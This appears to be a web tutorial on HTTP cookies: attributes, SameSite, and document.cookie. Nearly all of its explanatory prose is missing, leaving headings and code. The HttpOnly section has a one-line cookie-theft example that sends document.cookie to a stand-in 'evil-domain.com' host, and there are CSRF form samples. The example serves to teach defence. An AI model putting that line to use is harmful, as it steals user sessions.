# Cookie

## 

Cookie 4KB

HTTP  Cookie  Cookie`id=1234`

Cookie 

- session
- 
- 

Cookie 4KB Web storage API  IndexedDB Cookie 

 Cookie 

- Cookie 
- Cookie 
- 
- 
- 

`www.example.com` Cookie Cookie `www.example.com``/`

 Cookie `/forums` Cookie `www.example.com/forums` Cookie

 Cookie Cookie`window.navigator.cookieEnabled` Cookie 

```javascript
window.navigator.cookieEnabled // true
```

`document.cookie` Cookie

```javascript
document.cookie // "id=foo;key=bar"
```

 Cookie  Cookie 30 Cookie  4KBCookie 

Cookie `foo.com` Cookie`bar.com` Cookie Cookie`mydomain.com``subdomain.mydomain.com` Cookie Cookie `domain` Cookie

```http
Set-Cookie: name=value; domain=mydomain.com
```

 Cookie `domain``mydomain.com` Cookie

 Cookie `http://example.com` Cookie`https://example.com``http://example.com:8080`

## Cookie  HTTP 

Cookie  HTTP  HTTP 

### HTTP Cookie 

 Cookie HTTP `Set-Cookie`

```http
Set-Cookie:foo=bar
```

`foo` Cookie`bar`

HTTP `Set-Cookie` Cookie

```http
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

 Cookie `Set-Cookie` Cookie 

```http
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
```



`Set-Cookie`

```http
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
```



```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

 CookieCookie `key``domain``path``secure` Cookie `Set-Cookie`

```http
Set-Cookie: key1=value1; domain=example.com; path=/blog
```

 Cookie `Set-Cookie`

```http
Set-Cookie: key1=value2; domain=example.com; path=/blog
```

 Cookie Cookie

```http
Set-Cookie: key1=value2; domain=example.com; path=/
```

 Cookie`path``example.com/blog` Cookie

```http
Cookie: key1=value1; key1=value2
```

 Cookie  Cookie 

### HTTP Cookie 

 HTTP  Cookie HTTP `Cookie`

```http
Cookie: foo=bar
```

`foo` Cookie`bar`

`Cookie` Cookie`;`

```http
Cookie: name=value; name2=value2; name3=value3
```



```http
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

 Cookie 

- Cookie 
-  Cookie

## Cookie 

### ExpiresMax-Age

`Expires` Cookie UTC `Date.prototype.toUTCString()`

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

`null`Cookie session Session  Cookie  Cookie  Cookie 

`Max-Age` Cookie `60 * 60 * 24 * 365` Cookie

`Expires``Max-Age``Max-Age`

`Set-Cookie``Expires``Max-Age` Cookie  Session Cookie Cookie

### DomainPath

`Domain` Cookie  HTTP  Cookie

 Cookie  Domain  IP  Domain 

 Domain Domain  .com.net  github.io Cookie

`x.y.z.com` Domain `x.y.z.com``y.z.com``z.com``foo.x.y.z.com``another.domain.com`

`wangdoc.github.io` Domain `wangdoc.github.io``github.io`

 Cookie Domain Domain `y.z.com``y.z.com``x.y.z.com``foo.x.y.z.com`Domain `github.io``github.io``wangdoc.github.io`

`Path` HTTP  Cookie`Path` HTTP  Cookie`Path``/``/docs` Cookie Domain 

### SecureHttpOnly

`Secure` HTTPS  Cookie  HTTP`Secure` HTTPS 

`HttpOnly` Cookie  JavaScript `document.cookie``XMLHttpRequest` Request API  Cookie  HTTP  Cookie

```javascript
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

 Cookie  Cookie `HttpOnly` Cookie

### SameSite

Chrome 51  Cookie `SameSite` CSRF 

Cookie  Cookie  HTTP  CSRF `your-bank.com` Cookie

```http
Set-Cookie:id=a3fWa;
```

`malicious.com`

```html
<form action="your-bank.com/transfer" method="POST">
  ...
</form>
```

 Cookie  token token

```html
<form action="your-bank.com/transfer" method="POST">
  <input type="hidden" name="token" value="dad3weg34">
  ...
</form>
```

 Cookie Cookie CSRF Facebook 

```html
<img src="facebook.com" style="visibility:hidden;">
```

 Facebook  Cookie  Facebook 

Cookie `SameSite` Cookie

> - Strict
> - Lax
> - None

**1Strict**

`Strict` Cookie Cookie URL  Cookie

```http
Set-Cookie: CookieName=CookieValue; SameSite=Strict;
```

 GitHub  GitHub  Cookie

**2Lax**

`Lax` Cookie Get 

```html
Set-Cookie: CookieName=CookieValue; SameSite=Lax;
```

 GET GET 

|   |                                  |     | Lax         |
|-----------|:------------------------------------:|------------:|-------------|
|       | `<a href="..."></a>`                 |  Cookie |  Cookie |
|     | `<link rel="prerender" href="..."/>` |  Cookie |  Cookie |
| GET   | `<form method="GET" action="...">`   |  Cookie |  Cookie |
| POST  | `<form method="POST" action="...">`  |  Cookie |       |
| iframe    | `<iframe src="..."></iframe>`        |  Cookie |       |
| AJAX      | `$.get("...")`                       |  Cookie |       |
| Image     | `<img src="...">`                    |  Cookie |       |

`Strict``Lax` CSRF  SameSite 

**3None**

Chrome `Lax``SameSite``None``Secure`Cookie  HTTPS 



```text
Set-Cookie: widget_session=abc123; SameSite=None
```



```text
Set-Cookie: widget_session=abc123; SameSite=None; Secure
```

## document.cookie

`document.cookie` Cookie

 Cookie Cookie `HTTPOnly`

```javascript
document.cookie // "foo=bar;baz=bar"
```

`document.cookie` Cookie Cookie 

```javascript
var cookies = document.cookie.split(';');

for (var i = 0; i < cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
```

`document.cookie` Cookie

```javascript
document.cookie = 'fontSize=14';
```

Cookie `key=value` Cookie  Cookie `encodeURIComponent`

`document.cookie` Cookie

```javascript
document.cookie = 'test1=hello';
document.cookie = 'test2=world';
document.cookie
// test1=hello;test2=world
```

`document.cookie` Cookie Cookie HTTP  Cookie  Cookie `Cookie` Cookie  Cookie `Set-Cookie` Cookie

 Cookie  Cookie 

```javascript
document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
```

 Cookie `expires`



- `path`
- `domain` Cookie `example.com``foo.com` Cookie
- `max-age`
- `expires` UTC `Date.prototype.toUTCString()`

`document.cookie` Cookie 

```javascript
document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=example.com';
```

`domain``.example.com` Cookie

Cookie 

 Cookie `expires`

```javascript
document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
```

`fontSize` Cookie 197011 Cookie

## 

- [HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies), by MDN
- [Using the Same-Site Cookie Attribute to Prevent CSRF Attacks](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/)
- [SameSite cookies explained](https://web.dev/samesite-cookies-explained)
- [Tough Cookies](https://scotthelme.co.uk/tough-cookies/), Scott Helme
- [Cross-Site Request Forgery is dead!](https://scotthelme.co.uk/csrf-is-dead/), Scott Helme

